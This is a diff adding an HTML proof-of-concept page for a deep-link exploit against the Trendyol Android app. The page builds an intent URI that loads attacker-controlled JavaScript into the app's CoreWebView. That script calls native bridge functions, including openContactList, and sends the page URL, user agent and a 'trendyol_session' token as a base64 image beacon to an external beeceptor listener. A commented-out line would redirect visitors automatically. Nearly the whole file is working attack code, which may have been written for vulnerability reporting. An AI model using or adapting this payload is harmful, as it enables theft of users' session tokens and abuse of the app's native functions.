@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trendyol DeepLink Validation PoC</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding: 20px;
+            background-color: #f9f9f9;
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h2 {
+            color: #ff6000; /* Trendyol brand color style */
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+        .btn {
+            display: inline-block;
+            background-color: #ff6000;
+            color: white;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background 0.2s;
+        }
+        .btn:hover {
+            background-color: #e05500;
+        }
+        .info-box {
+            margin-top: 25px;
+            padding: 10px;
+            background: #eee;
+            border-left: 4px solid #777;
+            font-family: monospace;
+            font-size: 12px;
+            text-align: left;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Exploit Validation Sandbox</h2>
+    <p>Testing logic inversion bypass via exported <code>SplashActivity</code> router.</p>
+    
+    <!-- Manual Trigger Button -->
+    <a href="#" id="exploitLink" class="btn">Launch Validation Payload</a>
+
+    <div class="info-box">
+        <strong>Target Intent URI:</strong><br>
+        <span id="intentUriDisplay">Generating...</span>
+    </div>
+</div>
+
+<script>
+    // Config configuration
+    const listenerUrl = "https://evilios.free.beeceptor.com";
+    
+    // 1. Build the payload that runs inside the vulnerable CoreWebView context
+    // This payload converts contacts or available session artifacts and forwards them to your listener.
+    const payloadJS = `
+        try {
+            if (window.NativeAndroidInterface) {
+                // Trigger contact list exposure
+                window.NativeAndroidInterface.openContactList();
+                
+                // Exfiltrate contextual data / localstorage availability to the listener
+                var exfilData = {
+                    origin: window.location.href,
+                    ua: navigator.userAgent,
+                    tokens: localStorage.getItem("trendyol_session") || "No Direct LocalStorage Access"
+                };
+                
+                // Exfiltrate via fetch image beacon to circumvent potential CORS restrictions
+                var img = new Image();
+                img.src = "${listenerUrl}/?data=" + btoa(JSON.stringify(exfilData));
+                
+                // Demonstrate UI manipulation capability
+                window.NativeAndroidInterface.showNativeDialog(
+                    "PoC Execution Verified",
+                    "Arbitrary WebUrl allowed due to EXP_AndroidWebDeeplinkWhiteListEnabled logic inversion.",
+                    "OK"
+                );
+            }
+        } catch(e) {
+            var img = new Image();
+            img.src = "${listenerUrl}/?error=" + btoa(e.message);
+        }
+    `;
+
+    // 2. Generate a Data URI containing the exploit JavaScript payload
+    // Wrapping it as a data uri allows self-contained execution without an external domain dependency.
+    const dataUriHtml = `data:text/html;base64,${btoa('<html><body><script>' + payloadJS + '<\/script></body></html>')}`;
+
+    // 3. Construct the clean Android Intent deep link target
+    // Page: CoreWebView, WebUrl: our payload data URI, Title: Spoofed Context Label
+    const baseDeeplink = `ty://?Page=CoreWebView&WebUrl=${encodeURIComponent(dataUriHtml)}&Title=Verified+Security+Validation`;
+
+    // Convert standard deep link to Chrome intent formatting for stable execution from modern browsers
+    const androidIntentUri = `intent://#Intent;scheme=ty;package=com.trendyol.trendyol;B.EXP_AndroidWebDeeplinkWhiteListEnabled=true;S.browser_fallback_url=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.trendyol.trendyol;end;`;
+    
+    // Inject the payload directly into the browser's component handling string structure
+    // Replacing standard intent parsing structure with the raw explicit deep link mapping syntax
+    const ChromeIntentLink = `intent://?Page=CoreWebView&WebUrl=${encodeURIComponent(dataUriHtml)}&Title=Security+Validation#Intent;scheme=ty;package=com.trendyol.trendyol;end;`;
+
+    // Update UI elements
+    document.getElementById('exploitLink').href = ChromeIntentLink;
+    document.getElementById('intentUriDisplay').innerText = ChromeIntentLink;
+
+    // 4. Automated fallback execution attempt
+    window.onload = function() {
+        setTimeout(function() {
+            // Uncomment the line below if you want automated redirection behavior upon site navigation
+            // window.location.href = ChromeIntentLink;
+        }, 1500);
+    };
+</script>
+
+</body>
+</html>
